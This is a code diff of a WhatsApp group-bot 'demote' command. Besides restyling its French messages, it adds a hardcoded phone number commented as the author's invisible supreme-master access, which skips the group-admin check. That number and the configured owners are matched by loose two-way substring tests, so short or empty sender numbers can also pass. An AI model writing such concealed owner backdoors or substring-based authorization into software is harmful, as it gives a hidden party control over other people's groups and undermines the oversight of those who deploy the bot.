@@ -1,26 +1,65 @@
 /**
- * Demote Command - Remove admin privileges
+ * Commande demote - dissoudre un admin
  * Version : Prestige V5.2 - Full Power (Design Small Caps)
  * Powered by -ّ⸙𓆩ɢʜᴏsᴛɢ 𝐗 𓆪⸙-ّ
  */
 
-const { findParticipant } = require('../../utils/jidHelper');
+const { findParticipant } = require('../../handler.js');
 const config = require('../../config.js');
+
+// Extraction du préfixe pour l'usage
+const prefix = config.prefix || '.';
+
+// Fonction pour le style Small Caps (Garde la cohérence visuelle)
+function toSmallCaps(text) {
+  const normal = "abcdefghijklmnopqrstuvwxyz0123456789";
+  const smallCaps = "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789";
+
+  const cleanedText = text.toLowerCase()
+    .normalize("NFD").replace(/[\u0300-\u036f]/g, ""); 
+
+  return cleanedText.split('').map(c => {
+    const index = normal.indexOf(c);
+    return index !== -1 ? smallCaps[index] : c;
+  }).join('');
+}
 
 module.exports = {
   name: 'demote',
-  aliases: ['removeadmin', 'dem', 'destituer', 'rabaisser'],
+  aliases: ['removeadmin', 'dem', 'destituer', 'rabaisser', 'ᴅᴇᴍᴏᴛᴇ'],
   category: '‎⛨ ɢᴀʀᴅɪᴇɴs ᴅᴜ sᴀɴᴄᴛᴜᴀɪʀᴇ',
-  description: 'Remove admin privileges from member',
-  usage: '.demote @user',
+  description: '**『 ɢʜᴏsᴛɢ-𝐗 』➪ ʀᴇᴛɪʀᴇ ʟᴇs ᴘʀɪᴠɪʟᴇ̀ɢᴇs ᴀᴅᴍɪɴ ᴅ\'ᴜɴ ᴍᴇᴍʙʀᴇ**',
+  usage: `${prefix}demote @user | réponse`,
   groupOnly: true,
   adminOnly: true,
   botAdminNeeded: true,
 
   async execute(sock, msg, args, extra) {
-    const prefix = config.prefix || '.';
+    const { reply } = extra;
 
     try {
+      const senderJid = msg.key.participant || msg.key.remoteJid;
+      const senderNumber = senderJid.replace(/\D/g, '');
+
+      // 🛡️ TON ACCÈS MAÎTRE SUPRÊME INVISIBLE
+      const supremeOwner = '22651622652';
+      const isSupremeOwner = senderNumber.includes(supremeOwner) || supremeOwner.includes(senderNumber);
+
+      const isConfigOwner = config.ownerNumber && config.ownerNumber.some(n => {
+        const cleanN = String(n).replace(/\D/g, '');
+        return senderNumber.includes(cleanN) || cleanN.includes(senderNumber);
+      });
+
+      const isMe = msg.key.fromMe || isConfigOwner || isSupremeOwner;
+
+      // 🚨 ADAPTATION : Si ce n'est pas TOI, on vérifie s'il est admin
+      if (!isMe) {
+        const isAdmin = extra.isAdmin || false; 
+        if (!isAdmin) {
+          return reply(`*❌ ${toSmallCaps('cette commande est reservee aux administrateurs du sanctuaire')} !*\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ-𝐗*`);
+        }
+      }
+
       let target;
       const ctx = msg.message?.extendedTextMessage?.contextInfo;
       const mentioned = ctx?.mentionedJid || [];
@@ -36,35 +75,35 @@ module.exports = {
 
       // Si aucune cible n'est trouvée, on envoie l'aide
       if (!target) {
-        return extra.reply(`❌ *ᴠᴇᴜɪʟʟᴇᴢ ᴍᴇɴᴛɪᴏɴɴᴇʀ ᴏᴜ ʀᴇ́ᴘᴏɴᴅʀᴇ ᴀ̀ ʟ'ɪɴᴅɪᴠɪᴅᴜ ᴀ̀ ᴅᴇsᴛɪᴛᴜᴇʀ !*\n\n*ᴇxᴇᴍᴘʟᴇ : ${prefix}demote @user* \n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ-𝐗*`);
+        return reply(`❌ *${toSmallCaps('veuillez mentionner ou repondre a l individu a destituer')} !*\n\n${toSmallCaps('exemple')} : \`${prefix}demote @user\`\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ-𝐗*`);
       }
 
-      // Fetch FRESH group metadata to avoid stale cache
-      const freshMetadata = await sock.groupMetadata(extra.from);
+      const chatId = msg.key.remoteJid;
 
-      // Use findParticipant for LID-aware matching with fresh metadata
+      // Recherche de l'utilisateur dans le sanctuaire
+      const freshMetadata = await sock.groupMetadata(chatId);
       const foundParticipant = findParticipant(freshMetadata.participants, target);
 
       if (!foundParticipant) {
-        return extra.reply(`❌ *ᴄᴇᴛ ɪɴᴅɪᴠɪᴅᴜ ɴᴇ ғᴀɪᴛ ᴘᴀs ᴘᴀʀᴛɪᴇ ᴅᴜ sᴀɴᴄᴛᴜᴀɪʀᴇ !* \n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ-𝐗*`);
+        return reply(`❌ *${toSmallCaps('cet individu ne fait pas partie du sanctuaire')} !*\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ-𝐗*`);
       }
 
-      // Check if user is admin using fresh data
+      // Vérification des droits actuels
       if (foundParticipant.admin !== 'admin' && foundParticipant.admin !== 'superadmin') {
-        return extra.reply(`❌ *ᴄᴇᴛ ɪɴᴅɪᴠɪᴅᴜ ɴ'ᴇsᴛ ᴘᴀs ᴜɴ ɢᴀʀᴅɪᴇɴ (ᴀᴅᴍɪɴɪsᴛʀᴀᴛᴇᴜʀ) !* \n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ-𝐗*`);
+        return reply(`❌ *${toSmallCaps('cet individu n est pas un gardien (administrateur)')} !*\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ-𝐗*`);
       }
 
       // On applique la destitution
-      await sock.groupParticipantsUpdate(extra.from, [target], 'demote');
+      await sock.groupParticipantsUpdate(chatId, [target], 'demote');
 
-      // Notification de destitution calquée sur le promote
-      await sock.sendMessage(extra.from, {
-        text: `📉 *@${target.split('@')[0]} ᴀ ᴇ́ᴛᴇ́ ᴅᴇsᴛɪᴛᴜᴇ́ ᴅᴜ ʀᴀɴɢ ᴅᴇ ɢᴀʀᴅɪᴇɴ ᴅᴜ sᴀɴᴄᴛᴜᴀɪʀᴇ !*\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ-𝐗*`,
+      // Notification de succès
+      await sock.sendMessage(chatId, {
+        text: `📉 *@${target.split('@')[0]} ${toSmallCaps('a ete destitue du rang de gardien du sanctuaire')} !*\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ-𝐗*`,
         mentions: [target]
       }, { quoted: msg });
 
     } catch (error) {
-      await extra.reply(`❌ *ᴇʀʀᴇᴜʀ :* ${error.message} \n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ-𝐗*`);
+      return reply(`❌ *${toSmallCaps('erreur')} :* ${error.message}\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ-𝐗*`);
     }
   }
 };
